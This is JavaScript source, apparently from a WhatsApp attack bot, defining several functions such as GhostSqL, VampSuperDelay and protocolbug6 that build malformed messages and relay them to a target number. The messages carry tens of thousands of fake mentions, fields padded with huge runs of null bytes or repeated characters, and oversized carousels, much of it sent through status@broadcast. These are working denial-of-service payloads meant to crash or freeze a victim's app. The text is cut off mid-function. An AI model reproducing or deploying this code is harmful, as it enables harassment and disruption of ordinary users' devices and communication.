async function GhostSqL(target) {
console.log(chalk.red("Proses Sending Bug...."));

  const mentionedList = [
        "696969696969@s.whatsapp.net",
        "phynx@agency.whatsapp.biz",
        ...Array.from({ length: 35000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: Math.floor(99.99 * 1073741824).toString(),
                    height: 999,
                    width: 999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: null,
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493],
                    annotations: [
                        {
                           embeddedContent: {
                             embeddedMusic: {
                               musicContentMediaId: "1",
                                 songId: "peler",
                                 author: ".RaldzzXyz",
                                 title: "PhynxAgency",
                                 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                 artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                                 countryBlocklist: true,
                                 isExplicit: true,
                                 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                               }
                             },
                           embeddedAction: true
                         }
                       ]
                     },
                   hasMediaAttachment: true, 
                 },
                body: { 
                  text: ""
                },
                footer: {
                  text: ""
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          },
          contextInfo: {
            participant: target,
            remoteJid: target,
            stanzaId: IqbalXpn.generateMessageTag(),
            mentionedJid: mentionedList,
             quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "TuruDek",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        header: "🩸",
                        body: "🩸",
                        flow_action: "navigate",
                        flow_action_payload: { screen: "FORM_SCREEN" },
                        flow_cta: "Grattler",
                        flow_id: "1169834181134583",
                        flow_message_version: "3",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await IqbalXpn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
async function CursorDelayInvis(target) {
console.log(chalk.red("Proses Sending Bug...."));
const mentionedList = Array.from({ length: 43000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Im Coming Baby',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                    fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749258106",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
                    scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                    scanLengths: [ 5657, 38661, 12072, 27792 ],
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "⛧ KEPO LU YA ⛧"
                },
                footer: {
                  text: "xeon.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Demon Back Baby",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});
  
  await IqbalXpn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
} 
async function VampSuperDelay(target, mention = false) {
console.log(chalk.red("Proses Sending Bug...."));
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Vampire Crash" + "ោ៝".repeat(10000),
        title: "Iqbhalkeifer",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.youtube.com/@iqbhalkeifer25",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "V A M P I R E  H E R E ! ! !",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "VampClouds"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await IqbalXpn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await IqbalXpn.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function xatanicaldelayv2(target, mention) {
console.log(chalk.red("Proses Sending Bug...."));
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await IqbalXpn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function protocolbug6(target, mention) {
console.log(chalk.red("Proses Sending Bug...."));
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "X-VEROS ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await IqbalXpn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await IqbalXpn.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}
async function CosmoApiDelay(target, mention = true) { // Default true biar otomatis nyala
console.log(chalk.red("Proses Sending Bug...."));
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "RyuuX🫀",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };
  

    const msg = generateWAMessageFromContent(target, MSG, {});

    await IqbalXpn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await IqbalXpn.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Hades Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function Cursor(target) {
console.log(chalk.red("Proses Sending Bug...."));
let cards = [];

for (let r = 0; r < 1000; r++) {
cards.push({
body: { text: '\u0000\u0000\u0000\u0000\u0000' },
header: {
title: '\u0000\u0000\u0000\u0000\u0000',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "98",
height: 4,
width: 4,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: '𝘌𝘷𝘰𝘶𝘳𝘵𝘩 𝘛𝘩𝘦 𝘌𝘳𝘢 𝘐𝘴 𝘉𝘢𝘤𝘬',
buttons: [
{
name: "payment_info",
buttonParamsJson: `{}`
}
]
}
});
}

let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { text: 'DemonHunter New Eraa' },
footer: { text: '\u0000' },
carouselMessage: {
cards: cards
},
contextInfo: {
participant: "0@s.whatsapp.net",
quotedMessage: {},
remoteJid: "@s.whatsapp.net"
}
}
}
}
}, {});

await IqbalXpn.relayMessage(target, msg.message, {
participant: { jid: target },
messageId: msg.key.id
});
}
async function DelayInVis(target) {
console.log(chalk.red("Proses Sending Bug...."));
  let push = [];
  push.push({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: " ",
      hasMediaAttachment: true,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
        fileLength: "18352",
        height: 720,
        width: 1280,
        mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
        fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
        directPath:
          "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1737281900",
        jpegThumbnail:
          "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
        scansSidecar:
          "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
        scanLengths: [3537, 10557, 1905, 2353],
        midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
      },
    }),
    nativeFlowMessage:
      proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [],
      }),
  });

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: "bijiku",
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false,
            }),
            carouselMessage:
              proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: [...push],
              }),
          }),
        },
      },
    },
    {}
  );

  await IqbalXpn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (target) {
    await IqbalXpn.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Cay Invisible!" },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function protocolbug8(target, mention) {
console.log(chalk.red("Proses Sending Bug...."));
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Xrelly Modderx" + "ោ៝".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
